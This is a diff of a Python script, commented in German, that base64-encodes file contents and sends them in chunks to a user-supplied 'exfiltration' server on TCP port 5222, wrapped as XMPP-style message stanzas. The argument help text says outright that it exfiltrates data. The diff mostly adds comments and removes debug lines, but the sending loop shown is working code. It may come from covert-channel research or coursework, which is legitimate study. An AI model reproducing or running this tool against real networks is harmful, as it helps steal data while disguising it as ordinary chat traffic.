@@ -38,6 +38,9 @@ parser.add_argument("-s", "--Segment", action="store_true", help = "Segement pac
 parser.add_argument("-t", "--Target", help = "IP address of server to send exfiltration data to")
 args = parser.parse_args()
 
+# SEG
+#   -> True: Packetgröße auf MTU limitieren
+#   -> False: Beliebige Packetgröße (ein Packet mit vollständigem Payload)
 SEG = False
 if args.Segment == True: SEG = True
 
@@ -72,41 +75,22 @@ b64content = base64.b64encode(content).decode()
 length = len(b64content)
 print("Length of payload bytestream (Base64 encoded): " + str(length) + "\n")
 
-test = """
-    <message
-        to='example.com'>
-        <body></body>
-    </message>
-    """
-b = test.encode("utf-8") # len 81 "Overhead"
-print(len(b))
-
 crwaler = CBORIterator(content)
 
-#a = getMessage(crwaler.getNextBytes(0)).encode("UTF-8")
-#b = getMessage(crwaler.getNextBytes(948)).encode("UTF-8")
-
-#print("Len a " + str(len(a)))
-#print("Len b: " + str(len(b)))
-
-# hex     : 632 - Blöcke
-# base 64 : 948 - Blöcke
-
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:        # Socket öffnen
     s.connect((SERVER_IP, 5222))
     packet_counter = 0
     idx = 0
 
     print("START sending packets")
-    while length - idx >= PSIZE and SEG: # nicht 100% genau
-        packet = getMessageStr(b64content[idx:idx+PSIZE])
+    while length - idx >= PSIZE and SEG:                            # Payload aufteilen
+        packet = getMessageStr(b64content[idx:idx+PSIZE])           # Message generieren
         output = packet.encode("utf-8")
-        #print(len(output))
         s.send(output)
         packet_counter += 1
         idx += PSIZE
     
-    packet = getMessageStr(b64content[idx:])
+    packet = getMessageStr(b64content[idx:])                        # restliche bytes senden
     #print("Last packet sent: ")
     #print(packet)
     output = packet.encode("utf-8")
